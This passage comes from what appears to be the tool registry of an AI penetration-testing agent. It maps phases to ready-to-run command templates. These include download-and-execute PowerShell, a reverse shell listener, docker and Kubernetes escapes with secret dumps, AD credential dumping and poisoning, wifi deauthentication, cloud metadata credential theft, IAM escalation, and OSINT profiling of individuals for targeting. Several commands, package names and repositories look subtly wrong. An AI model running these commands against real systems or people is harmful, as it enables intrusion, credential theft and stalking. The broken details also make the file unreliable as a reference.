      T("linpeas", "bash linpeas.sh -a -o {out}/linpeas.txt", { git: "https://github.com/peass-ng/PEASS-ng" }, "pspy + manual checks"),
      T("pspy", "./pspy64 -pf -r -o {out}/pspy.log", { git: "https://github.com/Dom97/PSPy" }, "systemctl list-timers"),
      T("sudo", "sudo -l -U; sudo -n -l", { apt: "sudo" }, "cat /etc/sudoers"),
      T("find", "find / -perm -4000 -type f 2>/dev/null | tee {out}/suid.txt; getcap -r / 2>/dev/null | tee {out}/caps.txt", { apt: "findutils" }, "manual"),
      T("capsh", "capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')", { apt: "libcap2-bin" }, "grep CapEff /proc/self/status"),
    ],
    notes: ["Check sudo -l, SUID/SGID, capabilities, writable systemd units, cron, docker.sock, writable /etc/passwd."],
  },
  "windows-privesc": {
    phase: "post",
    goal: "Windows privilege escalation",
    tools: [
      T("winpeas", "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{lab}/winpeas.exe')\" | Tee-Object {out}/winpeas.txt", { git: "https://github.com/peass-ng/PEASS-ng" }, "SharpUp"),
      T("PowerShell", "whoami /priv; cmdkey /list; reg query HKLM\\SYSTEM\\CurrentControlSet\\Services", {}, "winpeas"),
      T("netexec", "netexec {host} -u {user} -p {pass} --local-auth -x winrm,ssh,smb,rdp", GO_NETEXEC, "impacket"),
    ],
    notes: ["LOLBAS abuse, unquoted service paths, AlwaysInstallElevated, token impersonation, weak service ACLs."],
  },
  "container-escape": {
    phase: "post",
    goal: "Container and Kubernetes escape and cluster foothold",
    tools: [
      T("docker", "docker ps -a; ls -la /var/run/docker.sock; docker run -v /:/mnt --rm -it alpine chroot /mnt", { apt: "docker.io" }, "crictl / nsenter"),
      T("kubectl", "kubectl get secrets -A -o json > {out}/k8s_secrets.json; kubectl get pods -A", {}, "read the SA token directly"),
      T("capsh", "grep CapEff /proc/self/status; ls -la /dev/kmsg /proc/1/root", { apt: "libcap2-bin" }, "nsenter -t 1 -m -u -i -n -p -- /bin/bash"),
    ],
    notes: ["Check privileged flag, host mounts, /proc/1/root, docker.sock, CAP_SYS_ADMIN."],
  },
  "ad-enum": {
    phase: "post",
    goal: "Active Directory enumeration and attack-path mapping",
    tools: [
      T("bloodhound", "SharpHound.exe -c All -d {domain} -o {out}/bloodhound.zip", { pip: "sharphound" }, "netexec"),
      T("ldapsearch", "ldapsearch -x -H ldap://{dc}:389 -D '{user}' -w '{pass}' -b 'DC={domain}' '(objectClass=*)' dn > {out}/ldap.txt", { apt: "ldap-utils" }, "netexec"),
      T("netexec", "netexec {domain}/{hosts} -u '{user}' -p '{pass}' --shares --sessions --wins --enum-users", GO_NETEXEC, "crackmapexec"),
      T("impacket", "impacket-secretsdump {domain}.local/'{user}':'{pass}'@{dc} -domain-dsid", GO_IMPACKET, "netexec"),
      T("responder", "responder -I {iface} -v -w -u -U -P", { git: "https://github.com/lgandx/Responder" }, "nmap"),
    ],
    notes: ["BloodHound collection -> shortest path to Domain Admin / Tier-0. Watch for DCSync, AllowedToDelegate, GenericWrite chains."],
  },
  "lateral-movement": {
    phase: "post",
    goal: "Move laterally inside the authorized network",
    tools: [
      T("netexec", "netexec {domain}/{hosts} -u '{user}' -p '{pass}' -x smb,winrm,ssh,rdp,mssql,mysql --no-bruteforce", GO_NETEXEC, "impacket-psexec"),
      T("impacket", "impacket-psexec {domain}.local/'{user}':'{pass}'@{host} -dc-ip {dc}", GO_IMPACKET, "netexec"),
      T("smbclient", "smbclient -L //{host} -U '{user}%{pass}' -m SMB2; smbclient //{host}/IPC$ -U '{user}%{pass}' -c 'ls'", { apt: "smbclient" }, "netexec"),
      T("ssh", "ssh -o StrictHostKeyChecking=no '{user}'@{host} 'id'", { apt: "openssh-client" }, "pwncat"),
      T("pwncat", "pwncat -l {lab}:4444 -e /bin/sh", { pip: "pwncat" }, "ssh"),
      T("chisel", "chisel client {foothost}:{port} R:1080:socks", { go: "github.com/jpillora/chisel@latest" }, "ligolo-ng / gost"),
      T("ligolo-ng", "ligolo-proxy -tunnel -l 8888 -f {foothost}.ligo.yml", { go: "github.com/nicocha30/ligolo-ng@latest" }, "chisel"),
    ],
    notes: ["Map the internal network first, then take the shortest path to the objective instead of spraying."],
  },
  "persistence-mech": {
    phase: "post",
    goal: "Map and test persistence mechanisms on a foothold",
    tools: [
      T("netexec", "netexec {domain}/{host} -u '{user}' -p '{pass}' --enum-services --enum-sessions", GO_NETEXEC, "manual registry/schtasks checks"),
      T("impacket", "impacket-psexec -c 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'", GO_IMPACKET, "systemctl list-timers"),
      T("python3", "crontab -l; ls /etc/systemd/system/ /etc/cron.d/; cat /etc/ld.so.preload; ls ~/.ssh/", { apt: "python3" }, "systemctl list-timers"),
    ],
    notes: ["Enumerate always: cron/systemd/user-shell/ssh-keys/LD_PRELOAD/Run keys. Deploy only when the operator asks."],
  },
  "tunneling": {
    phase: "post",
    goal: "SOCKS and HTTP tunnels through a foothold for deeper access",
    tools: [
      T("chisel", "chisel server --reverse -p {port}  # on the foothold; client: chisel client {foothost}:{port} R:1080:socks", { go: "github.com/jpillora/chisel@latest" }, "ligolo-ng"),
      T("ligolo-ng", "ligolo-proxy -tunnel -l 8888", { go: "github.com/nicocha30/ligolo-ng@latest" }, "chisel"),
      T("ssh", "ssh -D 1080 -N -f '{user}'@{foothost}", { apt: "openssh-client" }, "gost"),
      T("socat", "socat TCP-LISTEN:1080,fork,reuseaddr TCP:{target}:{port}", { apt: "socat" }, "ssh -D"),
      T("gost", "gost -L socks5://:1080 -F ssh://'{user}'@{foothost}", { go: "github.com/ginuerzh/gost@latest" }, "chisel"),
    ],
  },
  "pcap-analysis": {
    phase: "post",
    goal: "Analyse captured traffic for credentials, tokens and cleartext protocols",
    tools: [
      T("tshark", "tshark -r {out}/cap.pcap -Y 'http.request||dns||tls.handshake' -T fields -e frame.time -e ip.src -e dns.qry.name -e http.host -e http.request.uri > {out}/tshark.txt", { apt: "tshark" }, "REA inspect_web_network_capture"),
      T("tcpdump", "tcpdump -nn -r {out}/cap.pcap -A > {out}/tcpdump.txt", { apt: "tcpdump" }),
      T("zeek", "zeek -r {out}/cap.pcap -C {out}/zeek", { apt: "zeek" }),
    ],
    notes: ["Look for HTTP basic auth, FTP, Telnet, SMTP AUTH, SNMP community strings, Kerberos tickets."],
  },
  "wifi-audit": {
    phase: "post",
    goal: "Wireless assessment of the operator's own test SSIDs",
    tools: [
      T("airmon-ng", "airmon-ng start {iface}", { apt: "airmon-ng" }, "iwconfig"),
      T("aircrack-ng", "aircrack-ng -w {out}/capture.cap -b {bssid} {out}/words.txt", { apt: "aircrack-ng" }, "hcxdumptool"),
      T("bettercap", "bettercap -eval 'wifi.recon on' -eval 'wifi.deauth on'", { go: "github.com/bettercap/bettercap@latest" }, "hcxdumptool"),
    ],
  },

  /* ---------------- reverse engineering ---------------- */
  "re-static": {
    phase: "reverse",
    goal: "Static analysis: layout, functions, strings, vulnerability candidates",
    tools: [
      T("rea", "open_binary(path='{path}') -> binary_overview() -> list_procedures() -> analyze_function(symbol) -> search_bytes/xrefs -> procedure_pseudo_code", {}, "objdump/readelf/strings"),
      T("objdump", "objdump -d -M intel {path} > {out}/disasm.txt; objdump -h {path}", { apt: "binutils" }, "rea"),
      T("readelf", "readelf -aW {path} > {out}/readelf.txt", { apt: "binutils" }, "rea"),
      T("strings", "strings -n 6 {path} > {out}/strings.txt", { apt: "binutils" }, "rea"),
      T("file", "file {path}; sha256sum {path}", { apt: "file" }, "rea"),
    ],
    notes: [
      "REA MCP flow: open_binary -> binary_overview -> list_procedures -> analyze_function -> search_bytes/xrefs -> procedure_pseudo_code.",
      "Triage order: entrypoints -> interesting strings (format/crypto/url) -> xrefs -> pseudo-code -> sinks.",
      "inspect_binary_layout gives NX/PIE/RELRO/canary - decide the exploit primitive before writing anything.",
    ],
  },
  "re-dynamic": {
    phase: "reverse",
    goal: "Dynamic analysis: debug, trace, anti-debug detection",
    tools: [
      T("rea", "start_rizin_debug_session(path='{path}', inferior_tty='/tmp/opencode/tty') -> rizin_debug_command('dc') -> close_rizin_debug_session()", {}, "gdb / strace"),
      T("gdb", "gdb -q {path} -ex 'b *main' -ex run -ex 'x/32gx $rsp' -ex 'info reg' > {out}/gdb.txt", { apt: "gdb" }, "rea gdb_console"),
      T("strace", "strace -f -o {out}/strace.txt {path}", { apt: "strace" }, "ltrace"),
      T("ltrace", "ltrace -f -o {out}/ltrace.txt {path}", { apt: "ltrace" }, "strace"),
      T("frida", "frida -f {path} -l {out}/hook.js --no-pause", { pip: "frida-tools" }, "rea frida sessions"),
    ],
    notes: ["Anti-debug tells: ptrace(PTRACE_TRACEME), TracerPid in /proc/self/status, RDTSC timing, int3 traps, CPUID VMX."],
  },
  "re-firmware": {
    phase: "reverse",
    goal: "Firmware extraction and IoT analysis",
    tools: [
      T("rea", "extract_firmware(path='{path}', output_dir='{out}/fw') -> open_binary(each extracted blob) -> inspect_binary_layout", {}, "binwalk"),
      T("binwalk", "binwalk -e -C {out}/binwalk {path}", GO_BINWALK, "rea extract_firmware"),
      T("unblob", "unblob -e {out}/unblob {path}", GO_UNBLOB, "rea extract_firmware"),
      T("strings", "strings -n 6 {path} | grep -iE 'password|passwd|admin|root|key|secret|login' | tee {out}/creds_hunt.txt", { apt: "binutils" }, "grep -a"),
    ],
    notes: ["Hunt hardcoded credentials in the extracted rootfs and default web admin panels."],
  },
  "re-managed": {
    phase: "reverse",
    goal: "Android, .NET, Electron and WASM managed-code analysis",
    tools: [
      T("rea", "inspect_managed_artifact(path='{path}') -> inspect_managed_members(path='{path}') -> decompile_jeb_item / inspect_android_method", {}, "jadx / apktool"),
      T("jadx", "jadx -d {out}/jadx {path}", { apt: "jadx" }, "rea"),
      T("apktool", "apktool d -f -o {out}/apk {path}", { apt: "apktool" }, "rea inspect_android_package"),
    ],
    notes: ["Taint path: user string -> method -> dangerous call (Process.Start, Assembly.Load, BinaryFormatter, addJavascriptInterface)."],
  },
  "exploit-dev": {
    phase: "exploit",
    goal: "Exploit development: gadgets, ROP, shellcode, reliability",
    tools: [
      T("pwntools", "python3 -c \"from pwn import *; e=ELF('{path}'); r=ROP(e); r.call('execve',['/bin/sh',0,0]); print(r.chain().hex())\" > {out}/ropchain.bin", GO_PWNTOOLS, "ROPgadget + ropper"),
      T("ROPgadget", "ROPgadget --binary {path} --ropchain > {out}/ropchain.txt", { pip: "ROPgadget" }, "ropper"),
      T("ropper", "ropper --file {path} --search 'pop rdi' --raw > {out}/gadgets.txt", { pip: "ropper" }, "ROPgadget"),
      T("one_gadget", "one_gadget {path}", { git: "https://github.com/david942j/one_gadget" }, "manual libc offsets"),
    ],
    notes: ["Triage mitigations first (NX/PIE/RELRO/canary/seccomp) via inspect_binary_layout, then build the chain to match."],
  },

  /* ---------------- malware analysis ---------------- */
  "malware-triage": {
    phase: "malware",
    goal: "Fast triage: type, hash, strings, packing, capabilities",
    tools: [
      T("file", "file {path}; sha256sum {path}; md5sum {path}", { apt: "file" }, "rea open_binary"),
      T("capa", "capa -d {path} -v > {out}/capa.txt", GO_CAPA, "strings + objdump imports"),
      T("floss", "floss {path} > {out}/floss.txt", GO_FLOSS, "strings -el"),
      T("strings", "strings -n 6 {path} > {out}/strings.txt; strings -el {path} >> {out}/strings.txt", { apt: "binutils" }, "floss"),
      T("yara", "yara -r {out}/rules {path}", GO_YARA, "capa"),
      T("ssdeep", "ssdeep {path} {out}/hashes.txt", { apt: "ssdeep" }, "sha256sum"),
      T("binwalk", "binwalk {path} > {out}/binwalk.txt", GO_BINWALK, "rea extract_firmware"),
    ],
    notes: ["Order: file -> hashes -> capa (capabilities) -> floss (obfuscated strings) -> YARA -> REA deep dive."],
  },
  "malware-config-extract": {
    phase: "malware",
    goal: "Extract the embedded config: C2, keys, campaign ID, mutex",
    tools: [
      T("rea", "open_binary(path='{path}') -> search_bytes(pattern) -> xrefs(address) -> analyze_function(caller)", {}, "strings + python3"),
      T("strings", "strings -n 6 {path} | grep -iE 'https?://|wss?://|\\.onion|mutex|botid|campaign' | tee {out}/c2_candidates.txt", { apt: "binutils" }, "floss"),
      T("python3", "python3 {out}/decrypt_config.py {path} > {out}/config.json", { apt: "python3" }, "write a small replay script"),
    ],
    notes: ["Find the decrypt routine (XOR loop / RC4 / AES-CTR), extract the key, replay the algorithm on the blob."],
  },
  "detection-artifacts": {
    phase: "malware",
    goal: "Produce YARA, Sigma and Suricata detection artifacts from the analysis",
    tools: [
      T("yara", "yara -w {out}/rules {path}; yara -w {out}/rules {out}/benign_sample", GO_YARA, "python3 + yara-python"),
      T("yara-python", "python3 -c \"import yara; print(yara.compile(filepath='{out}/rules.yar').match('{path}'))\"", { pip: "yara-python" }, "yara cli"),
      T("python3", "python3 {out}/gen_rules.py --sample {path} --out {out}/rules.yar", { apt: "python3" }, "hand-write the rule"),
    ],
    notes: [
      "Validate every rule against a clean corpus to control false positives.",
      "Ship the rule, the test corpus (malicious + benign that must not match) and the expected alert output.",
    ],
  },
  "adversary-emulation": {
    phase: "malware",
    goal: "Build lab-scoped emulation specimens and behaviour specs for detection validation",
    tools: [
      T("python3", "python3 {out}/specimen.py --campaign {campaign} --c2 {lab_c2} > {out}/specimen.log", { apt: "python3" }, "bash"),
      T("openssl", "openssl x509 -in {out}/lab.crt -noout -subject -dates", { apt: "openssl" }, "python3 ssl"),
      T("curl", "curl -s {lab_c2}/gate.php -o /dev/null -w '%{http_code}\\n'", { apt: "curl" }),
    ],
    notes: [
      "Output is a detection-validation instrument: atomic-style command simulators, benign stub beacons, protocol replay stubs pointing at operator-controlled endpoints only.",
      "Carry an unmistakable marker (RAPTOR-EMULATION-<campaign>) and ship the matching rule so the specimen proves the detection fires.",
      "Never deploy against machines outside the lab, and never point at third-party infrastructure.",
    ],
  },

  /* ---------------- OSINT / intelligence gathering ---------------- */
  "osint-domain": {
    phase: "recon",
    goal: "Full domain intelligence: registration, DNS, CT, ASN, infrastructure, history",
    tools: [
      T("whois", "whois {target} > {out}/whois.txt", { apt: "whois" }, "amass intel"),
      T("amass", "amass intel -d {target} -whois -asn -o {out}/domain_intel.txt", { apt: "amass" }, "whois"),
      T("dnsx", "dnsx -d {target} -a -aaaa -cname -ns -mx -txt -ptr -soa -silent -o {out}/domain_dns.txt", GO_DNSX, "dig +short ANY {target}"),
      T("curl", "curl -s 'https://crt.sh/?q=%25.{target}&output=json' -o {out}/ct.json && python3 -c \"import json;print('\\n'.join(sorted({n for e in json.load(open('{out}/ct.json')) for n in e['name_value'].split(chr(10))})))\" > {out}/ct_hosts.txt", { apt: "curl" }, "tlsx"),
      T("tlsx", "tlsx -d {target} -san -cn -so -silent -o {out}/domain_tls.txt", GO_TLSX, "openssl s_client"),
    ],
    notes: ["Passive only - no traffic hits the target beyond normal DNS.", "Output feeds the attack graph: nameservers -> zone transfer, CT hosts -> subdomain enum, ASN -> netblock mapping."],
  },
  "osint-company": {
    phase: "recon",
    goal: "Organisation footprint: employees, emails, domains, acquisitions, tech stack",
    tools: [
      T("theHarvester", "theHarvester -d {target} -b all -f {out}/harvester.html", { pip: "theHarvester" }, "websearch for '{target} employees'"),
      T("amass", "amass intel -org '{org}' -d {out}/org.txt", { apt: "amass" }, "whois"),
      T("h8mail", "h8mail -t {out}/targets.txt -o {out}/h8mail.txt", { pip: "h8mail" }, "theHarvester"),
      T("websearch", "websearch: '{org} employees contact email format security contact bug bounty'", {}, "theHarvester"),
    ],
    notes: ["Email format discovery (first.last@ / flast@) is what makes credential testing work later."],
  },
  "osint-person": {
    phase: "recon",
    goal: "Subject intelligence: identity, accounts, exposure, locations, breach data",
    tools: [
      T("sherlock", "sherlock {username} --output {out}/sherlock.txt", { git: "https://github.com/sherlock-project/sherlock" }, "maigret"),
      T("maigret", "maigret --timeout 20 --no-color --txt {out}/maigret.txt {username}", { pip: "maigret" }, "sherlock"),
      T("holehe", "holehe {email} --no-color -o {out}/holehe.txt", { pip: "holehe" }, "h8mail"),
      T("h8mail", "h8mail -t {out}/emails.txt --json {out}/h8mail.json", { pip: "h8mail" }, "holehe"),
      T("ghunt", "ghunt {email} --output {out}/ghunt.json", { pip: "ghunt" }, "theHarvester"),
      T("phoneinfoga", "phoneinfoga scan -n {phone} -o {out}/phone.txt", { go: "github.com/sundowndev/phoneinfoga@latest" }, "websearch"),
    ],
    notes: [
      "Correlate every hit back to an identifier (handle, email, phone, domain) - the dossier is the graph, not the list.",
      "Find the email format first, then the username pattern, then the provider accounts.",
      "Never publish collected personal data: keep it inside the engagement workspace as evidence.",
    ],
  },
  "osint-username": {
    phase: "recon",
    goal: "Username enumeration across platforms",
    tools: [
      T("sherlock", "sherlock {username} --output {out}/sherlock.txt --print-all", { git: "https://github.com/sherlock-project/sherlock" }, "maigret"),
      T("maigret", "maigret --timeout 20 --no-color --txt {out}/maigret.txt {username}", { pip: "maigret" }, "sherlock"),
    ],
    notes: ["A hit is a candidate link, not proof of identity - corroborate with an email or photo before trusting it."],
  },
  "osint-email": {
    phase: "recon",
    goal: "Email footprint: provider, breach exposure, MX, deliverability, SMTP",
    tools: [
      T("h8mail", "h8mail -t {out}/emails.txt --json {out}/h8mail.json", { pip: "h8mail" }, "websearch for the address in breach corpora"),
      T("theHarvester", "theHarvester -d {domain} -b all -f {out}/harvester.html", { pip: "theHarvester" }, "holehe"),
      T("smtp-user-enum", "smtp-user-enum -d {domain} -M {mx_host} -U {out}/users.txt", { git: "https://github.com/smtp-user-enum/smtp-user-enum" }, "swaks"),
      T("swaks", "swaks --to {email} --server {mx_host} --from {email} --h-Subject:'test' --body 'test' --timeout 10", { apt: "swaks" }, "python3 smtplib"),
      T("holehe", "holehe {email} --no-color -o {out}/holehe.txt", { pip: "holehe" }, "h8mail"),
    ],
    notes: ["SMTP VRFY/EXPN enumeration reveals valid mailboxes - that list is the credential-testing wordlist."],
  },
  "osint-breach": {
    phase: "recon",
    goal: "Credential and data exposure across breach corpora",
    tools: [
      T("h8mail", "h8mail -t {out}/emails.txt --json {out}/h8mail.json", { pip: "h8mail" }, "websearch the address + 'password'"),
      T("holehe", "holehe {email} --no-color -o {out}/holehe.txt", { pip: "holehe" }, "h8mail"),
      T("grep", "grep -rInE '(h8mail|breach)' {out}/", { apt: "grep" }, "check your own leak corpora"),
      T("websearch", "websearch: '\"{email}\" leak OR breach OR password OR pastebin'", {}, "h8mail"),
    ],
    notes: ["Never buy or scrape leaked credential dumps from third parties - use the legitimate breach-notification and corporate exposure paths."],
  },
  "osint-social": {
    phase: "recon",
    goal: "Social platform presence and cross-platform correlation",
    tools: [
      T("ghunt", "ghunt {email} --output {out}/ghunt.json", { pip: "ghunt" }, "sherlock"),
      T("sherlock", "sherlock {username} --output {out}/sherlock.txt", { git: "https://github.com/sherlock-project/sherlock" }, "maigret"),
      T("maigret", "maigret --timeout 20 --no-color --txt {out}/maigret.txt {username}", { pip: "maigret" }, "ghunt"),
      T("websearch", "websearch: '\"{username}\" OR \"{email}\" site:linkedin.com OR site:twitter.com OR site:github.com'", {}, "sherlock"),
    ],
  },
  "osint-geo": {
    phase: "recon",
    goal: "Geolocation from media, documents and device metadata",
    tools: [
      T("exiftool", "exiftool -gps:all -a -u -b {file} > {out}/gps.txt", { apt: "libimage-exiftool-perl" }, "python3 PIL"),
      T("ghunt", "ghunt {email} --output {out}/ghunt.json", { pip: "ghunt" }, "exiftool"),
      T("phoneinfoga", "phoneinfoga scan -n {phone} -o {out}/phone.txt", { go: "github.com/sundowndev/phoneinfoga@latest" }, "websearch"),
      T("websearch", "websearch: '\"{address}\" OR \"{phone}\" geolocation coordinates'", {}, "exiftool"),
    ],
    notes: ["Geolocation output stays inside the engagement workspace as evidence - it supports targeting, it is not for publishing."],
  },
  "osint-document": {
    phase: "recon",
    goal: "Document forensics: metadata, authorship, revision history, embedded data",
    tools: [
      T("exiftool", "exiftool -a -u -G1 {file} > {out}/docmeta.txt", { apt: "libimage-exiftool-perl" }, "pdfinfo"),
      T("pdfinfo", "pdfinfo {file}", { apt: "poppler-utils" }, "exiftool"),
      T("pdftotext", "pdftotext {file} {out}/doctext.txt", { apt: "poppler-utils" }, "strings"),
      T("strings", "strings -n 6 {file} | tee {out}/docstrings.txt | grep -iE 'author|user|company|@[a-z]|/home/|C:\\\\'", { apt: "binutils" }, "exiftool"),
    ],
    notes: ["Word .docx/.xlsx are zip containers - unzip and read docProps/core.xml for the real author and edit history."],
  },
  "osint-code": {
    phase: "recon",
    goal: "Source and code exposure: repos, dorks, secrets, history",
    tools: [
      T("git", "git clone --mirror {repo} {out}/repo.git && git -C {out}/repo.git log --all -p | tee {out}/history.txt | head -5000", {}, "curl the API"),
      T("trufflehog", "trufflehog git file://{out}/repo.git --only-verified --json > {out}/trufflehog.json", GO_TRUFFLEHOG, "gitleaks"),
      T("gitleaks", "gitleaks detect -s {out}/repo.git --log-opts='--all' -v -r {out}/gitleaks.txt", GO_GITLEAKS, "trufflehog"),
      T("semgrep", "semgrep --config=p/secrets --config=p/gitleaks --json -o {out}/semgrep.json {path}", { pip: "semgrep" }, "grep"),
      T("websearch", "websearch: 'site:github.com \"{org}\" OR \"{internal_hostname}\" OR \"{api_key_prefix}\"'", {}, "trufflehog"),
    ],
    notes: ["Dork for internal hostnames and API key prefixes - they reveal internal topology that DNS never will."],
  },
  "osint-infrastructure": {
    phase: "recon",
    goal: "Infrastructure history, netblocks, exposed services and shadow assets",
    tools: [
      T("amass", "amass intel -d {target} -ip -asn -active -o {out}/infra.txt", { apt: "amass" }, "shodan"),
      T("shodan", "shodan host {target} --fields ip_str,port,hostnames,vulns,org", { pip: "shodan" }, "censys"),
      T("censys", "censys search --limit 50 '{target}' --write {out}/censys.json", { pip: "censys" }, "shodan"),
      T("nmap", "nmap -sV -Pn -p- {target} -oX {out}/infra.xml", GO_NMAP, "naabu"),
    ],
  },
  "web-search-intel": {
    phase: "recon",
    goal: "Search-engine intelligence gathering",
    tools: [
      T("websearch", "websearch: '{query}'", {}, "curl to a search API"),
      T("webfetch", "webfetch '{url}' -> extract indicators, endpoints, leaked data", {}, "curl"),
      T("curl", "curl -sk '{url}' -o {out}/page.html", { apt: "curl" }),
    ],
    notes: ["Prefer search over scanning for intelligence - it leaves no trace on the target."],
  },

  /* ---------------- ops ---------------- */
  "report": {
    phase: "report",
    goal: "Build the evidence-backed report",
    tools: [
      T("raptor_report", "raptor_report(format='both')", {}, "hand-write the summary"),
      T("pandoc", "pandoc {out}/report.md -o {out}/report.pdf", { apt: "pandoc" }, "markdown is enough"),
    ],
  },
  "recon-diff": {
    phase: "report",
    goal: "Diff the current surface against the previous run",
    tools: [
      T("raptor_diff", "raptor_diff()", {}, "diff the raw files yourself"),
      T("diff", "diff {out}/surface_prev.txt {out}/surface_now.txt", { apt: "diffutils" }, "raptor_diff"),
    ],
  },

  /* =========== extended families (source of truth: ~/.raptor/tool-registry.json) =========== */

  /* ---------------- cloud & infrastructure-as-code ---------------- */
  "cloud-posture-audit": {
    phase: "surface",
    goal: "Multi-cloud security posture and compliance sweep",
    tools: [
      T("prowler", "prowler {provider} --output-dir {out}/prowler --log-level WARN", { pip: "prowler" }, "scoutsuite"),
      T("scoutsuite", "scout suite {provider} --report-dir {out}/scout", { pip: "scoutsuite" }, "prowler"),
      T("cloudsploit", "cloudsploit --config {out}/config.json --report-dir {out}/cloudsploit", { npm: "cloudsploit" }, "prowler"),
      T("cloudmapper", "cloudmapper account_id --config {out}/config.json", { pip: "cloudmapper" }, "aws sts get-caller-identity"),
      T("checkov", "checkov -d {path} --framework all --output json > {out}/checkov.json", { pip: "checkov" }, "terrascan"),
      T("terrascan", "terrascan scan -t all -r -o {out}/terrascan.json {path}", { go: "github.com/tenable/terrascan/cmd/terrascan@latest" }, "checkov"),
    ],
    notes: [
      "creds first: AWS_SESSION_TOKEN / AZURE_CLIENT_SECRET / GOOGLE_APPLICATION_CREDENTIALS must be set or the audit is uniformative.",
      "A CIS FAIL is a finding; a CIS INFO is a note.",
      "Record the account/subscription/project id you actually audited - a different one makes the report unusable.",
    ],
  },
  "cloud-aws-audit": {
    phase: "surface",
    goal: "AWS-only posture assessment",
    tools: [
      T("aws", "aws sts get-caller-identity --output json > {out}/aws_identity.json", { pip: "awscli" }, "prowler aws"),
      T("prowler", "prowler aws --compliance cis_2.0 --output-dir {out}/prowler --log-level WARN", { pip: "prowler" }, "scoutsuite"),
      T("aws", "aws iam get-account-summary --output json > {out}/iam_summary.json && aws s3 ls --no-sign-request > {out}/buckets.txt", {}, "s3scanner"),
      T("cloud_enum", "cloud_enum -k {org} -l {out}/cloud_enum.txt", { go: "github.com/initstring/cloud_enum@latest" }, "s3scanner"),
    ],
    notes: [
      "aws sts get-caller-identity is step 0 - it proves whose identity you are acting with. Never guess the account.",
      "IAM privesc path: get-account-summary -> list-users -> who has an access key -> what they are allowed to do.",
    ],
  },
  "cloud-azure-audit": {
    phase: "surface",
    goal: "Azure posture assessment",
    tools: [
      T("az", "az account show --output json > {out}/az_identity.json", { apt: "azure-cli" }, "az rest"),
      T("prowler", "prowler azure --az-cli-auth --az-subscription {sub} --output-dir {out}/prowler_az --log-level WARN", { pip: "prowler" }, "scout suite azure"),
      T("scoutsuite", "scout suite azure --cli --report-dir {out}/scout_az", { pip: "scoutsuite" }, "prowler"),
      T("az", "az role assignment list --all --output json > {out}/az_roles.json", {}, "az role assignment"),
    ],
    notes: ["Azure Cloud Shell and managed identities are the fastest route to creds from inside a pod."],
  },
  "cloud-gcp-audit": {
    phase: "surface",
    goal: "GCP posture assessment",
    tools: [
      T("gcloud", "gcloud config get-value project --format=json > {out}/gcp_identity.json", { apt: "google-cloud-cli" }, "prowler gcp"),
      T("prowler", "prowler gcp --gcp-env --output-dir {out}/prowler_gcp --log-level WARN", { pip: "prowler" }, "scout suite gcp"),
      T("scoutsuite", "scout suite gcp --cli --report-dir {out}/scout_gcp", { pip: "scoutsuite" }, "prowler"),
    ],
    notes: ["Workload identity bindings and the metadata endpoint (metadata.google.internal) are the two highest-yield paths."],
  },
  "iam-privesc": {
    phase: "exploit",
    goal: "Cloud IAM privilege escalation discovery and proof",
    tools: [
      T("aws", "aws iam list-users --output json > {out}/iam_users.json && aws iam list-roles --output json > {out}/iam_roles.json", { pip: "awscli" }, "prowler"),
      T("cloudmapper", "cloudmapper enum --config {out}/config.json && cloudmapper find_privesc --config {out}/config.json", { pip: "cloudmapper" }, "prowler + manual policy review"),
      T("pacu", "python3 pacu.py --module iam__privesc_scan --output-dir {out}/pacu", { git: "https://github.com/PacuTools/Pacu" }, "cloudmapper find_privesc"),
      T("aws", "aws sts assume-role --role-arn {role} --role-session-name raptor-probe --output json > {out}/assume_role.json", {}, "iam__privesc_scan"),
      T("az", "az role assignment create --assignee {user} --role 'Contributor' --output json > {out}/az_privesc.json", {}, "manual az rbac"),
    ],
    notes: [
      "iam__privesc_scan is the highest-yield module - run it, then enumerate the permission it found.",
      "Prove the privesc with one command that shows what could NOT be done before the escalation.",
      "For assume-role: verify the role's trust policy allows your principal, not just that the role exists.",
    ],
  },
  "cloud-secrets": {
    phase: "exploit",
    goal: "Cloud secrets and credential material exposure",
    tools: [
      T("aws", "aws secretsmanager list-secret-values --secret-id '*' --output json > {out}/secrets.json", { pip: "awscli" }, "aws secretsmanager list-secrets"),
      T("aws", "aws s3 ls s3://{bucket}/ --no-sign-request > {out}/bucket_listing.txt && aws s3 cp s3://{bucket}/{key} - > {out}/bucket_file.txt", {}, "curl -s https://{bucket}.s3.amazonaws.com/"),
      T("gcloud", "gcloud secrets list --format=json > {out}/gcp_secrets.json", { apt: "google-cloud-cli" }, "gcloud secrets describe"),
      T("az", "az keyvault secret list --vault-name {vault} --output json > {out}/az_secrets.json", { apt: "azure-cli" }, "az keyvault"),
      T("trufflehog", "trufflehog filesystem {path} --no-update --only-verified", { go: "github.com/trufflesecurity/trufflehog@latest" }, "detect-secrets"),
    ],
    notes: [
      "Keys and tokens go into the operator's secret store, never into a report body. Report locations, not values.",
      "Prove a secret is real by testing it with one clearly-scoped read (aws sts, gcloud auth token, key decrypt).",
    ],
  },
  "imds-credential-hunt": {
    phase: "exploit",
    goal: "Metadata endpoint credential extraction via SSRF (IMDS chain)",
    tools: [
      T("curl", "curl -s -H 'Metadata: true' 'http://169.254.169.254/latest/meta-data/'", { apt: "curl" }, "python3 -c urllib"),
      T("curl", "curl -s -H 'Metadata: true' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'", {}, "IMDSv2 PUT token first"),
      T("curl", "curl -s -X PUT -H 'Metadata: true' 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 300'", {}, "IMDSv2 token fetch"),
      T("gcloud", "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'", { pip: "google-auth" }, "gcloud auth"),
    ],
    notes: [
      "IMDSv1 needs no token; IMDSv2 requires the PUT. Probe both and note which version you got.",
      "Once you have creds, get-caller-identity with them is the proof you are on a different principal.",
      "IMDS SSRF is the peak reveal for a web-only foothold - assume-role afterward is a full cloud foothold.",
    ],
  },
  "iac-scan": {
    phase: "surface",
    goal: "IaC policy evaluation and misconfiguration discovery",
    tools: [
      T("checkov", "checkov -d {path} --framework all --output json > {out}/checkov.json", { pip: "checkov" }, "terrascan"),
      T("terrascan", "terrascan scan -t all -i dockerfile -r -o {out}/terrascan.json {path}", { go: "github.com/tenable/terrascan/cmd/terrascan@latest" }, "checkov"),
      T("conftest", "conftest test --policy {out}/policies '{path}/terraform/*.tf'", { go: "github.com/open-policy-agent/conftest@latest" }, "opa eval"),
